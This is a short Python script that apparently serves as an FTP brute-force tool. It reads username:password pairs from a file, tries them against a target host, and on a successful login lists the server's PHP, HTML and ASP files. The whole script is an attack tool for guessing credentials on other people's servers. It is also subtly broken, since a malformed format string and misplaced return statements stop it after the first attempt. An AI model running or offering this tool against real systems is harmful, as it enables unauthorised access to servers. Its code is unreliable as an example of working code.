import ftplib
import argparse


def return_default(ftp):
    try:
        dir_list = ftp.nlst()

    except Exception as e:
        dir_list = []
        print('[-] Could not list directory contents')
        print('[-] Searching for next target')
        return dir_list

    ret_list = []
    for file_name in dir_list:
        fn = file_name.lower()
        if '.php' in fn or '.html' in fn or '.asp' in fn:
            ret_list.append(file_name)

        return ret_list


def brute_login(hostname, password):
    pwrd = open(password, 'r')
    for line in pwrd.readlines():
        username = line.split(':')[0]
        u_password = line.split(':')[1].strip('\r').strip('\n')

        print('Trying: {} - {}'.format(username, u_password))
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, u_password)
            print('Logon succeed.\nUsername: {} - Password: {]'.format(username, u_password))
            ftp_list = return_default(ftp)
            ftp.quit()
            return username, u_password

        except Exception as e:
            pass

        print('Logon failed! ')
        return None, None


def main():
    parser = argparse.ArgumentParser(prog='brute ftp', usage='brute -H <hostname> -pf <password list>')
    parser.add_argument('-H', dest='hostname', help='specify target host', type=str)
    parser.add_argument('-pf', dest='password_list', help='specify password file', type=str)

    args = parser.parse_args()

    hostname = args.hostname
    password_list = args.password_list

    if hostname is None or password_list is None:
        print(parser.usage)
        exit(0)

    brute_login(hostname, password_list)


if __name__ == '__main__':
    main()